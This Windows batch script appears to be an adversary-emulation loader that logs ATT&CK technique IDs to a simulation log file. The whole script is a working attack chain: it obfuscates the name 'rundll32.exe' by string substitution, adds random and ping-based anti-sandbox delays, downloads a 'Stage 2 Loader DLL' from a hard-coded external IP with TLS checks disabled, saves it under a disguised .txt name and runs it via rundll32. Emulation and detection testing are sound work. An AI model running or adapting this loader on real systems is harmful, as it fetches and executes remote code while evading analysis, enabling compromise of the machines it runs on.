@echo off
SETLOCAL EnableDelayedExpansion

REM ============================================
REM PHR placeholder assignments (random-named SET vars, one per PHR)
REM ============================================
SET akjdh=%APPDATA%\48870\8c87f869
SET vbnmc=ae8860cd.txt
SET zxmqp=https://3.144.153.50/test/stage/2/icon.png?QF1LQ28-R1dE
SET plkmj=BALAM-S2BO
SET qwert=QF1LQ28
SET asdfg=R1dE
SET zxcvb=%PUBLIC%\\macula-simulations.log

REM ============================================
REM Cache timestamp for debug logging
REM ============================================
SET tsvar=!DATE!/!TIME!

REM ============================================
REM Obfuscated LOLBIN variable setup (T1027)
REM Use string substitution encoding: X=r, Y=u, Z=n, A=d, B=l, C=3, D=2, E=., F=e, G=x
REM Build "rundll32.exe"
REM ============================================
SET lolbin_enc=XYZABBCDEFG
SET lolbin_enc=!lolbin_enc:X=r!
SET lolbin_enc=!lolbin_enc:Y=u!
SET lolbin_enc=!lolbin_enc:Z=n!
SET lolbin_enc=!lolbin_enc:A=d!
SET lolbin_enc=!lolbin_enc:B=l!
SET lolbin_enc=!lolbin_enc:B=l!
SET lolbin_enc=!lolbin_enc:C=3!
SET lolbin_enc=!lolbin_enc:D=2!
SET lolbin_enc=!lolbin_enc:E=.!
SET lolbin_enc=!lolbin_enc:F=e!
SET lolbin_enc=!lolbin_enc:G=x!
SET lolbin=!lolbin_enc!.exe

REM ============================================
REM TTP log for T1027 – obfuscation setup complete
REM ============================================
echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1027^|Obfuscated Files or Information=OK: >> "!zxcvb!" 2>nul

REM ============================================
REM Log file header (optional, but ensure writeable)
REM ============================================
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: script_start >> "!zxcvb!" 2>nul

REM ============================================
REM Step 0: Anti-sandbox delay – initial 10-20s random
REM ============================================
SET /A delay=%RANDOM% %% 20 + 10
timeout /t !delay! /nobreak >nul
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: initial_delay_complete=!delay! >> "!zxcvb!" 2>nul
REM T1497 logged after anti-sandbox delay completes
echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1497^|Virtualization/Sandbox Evasion=OK: >> "!zxcvb!" 2>nul

REM ============================================
REM Step 1: Heartbeat fetch – download Stage 2 Loader DLL
REM ============================================
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: heartbeat_start >> "!zxcvb!" 2>nul
curl -k -s -o "!akjdh!\!vbnmc!" "!zxmqp!"
IF ERRORLEVEL 1 (
    echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: heartbeat_fail >> "!zxcvb!" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: heartbeat_complete >> "!zxcvb!" 2>nul
)

REM ============================================
REM Anti-sandbox delay – 5-15s between operations (timeout)
REM ============================================
timeout /t 8 /nobreak >nul
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: delay_timeout_8s >> "!zxcvb!" 2>nul

REM ============================================
REM Step 2: Change to output directory
REM ============================================
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: chdir_start >> "!zxcvb!" 2>nul
cd /d "!akjdh!" >nul 2>&1
IF ERRORLEVEL 1 (
    echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: chdir_result=1 >> "!zxcvb!" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: chdir_result=0 >> "!zxcvb!" 2>nul
)

REM ============================================
REM Anti-sandbox delay – ping method
REM ============================================
ping -n 5 127.0.0.1 >nul
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: delay_ping_5 >> "!zxcvb!" 2>nul

REM ============================================
REM Step 3: Invoke downloaded Stage 2 Loader DLL via obfuscated rundll32
REM ============================================
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: rundll32_start >> "!zxcvb!" 2>nul
!lolbin! !vbnmc!, RunDLLW
IF ERRORLEVEL 1 (
    echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: rundll32_result=1 >> "!zxcvb!" 2>nul
    echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1218^|System Binary Proxy Execution=FAIL:rundll32_failed >> "!zxcvb!" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: rundll32_result=0 >> "!zxcvb!" 2>nul
    echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1218^|System Binary Proxy Execution=OK: >> "!zxcvb!" 2>nul
)

REM ============================================
REM Final anti-sandbox delay (optional, to cover execution)
REM ============================================
for /l %%i in (1,1,3) do timeout /t 1 /nobreak >nul
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: final_delay_loop >> "!zxcvb!" 2>nul

REM ============================================
REM Script exit
REM ============================================
ENDLOCAL
exit /b 0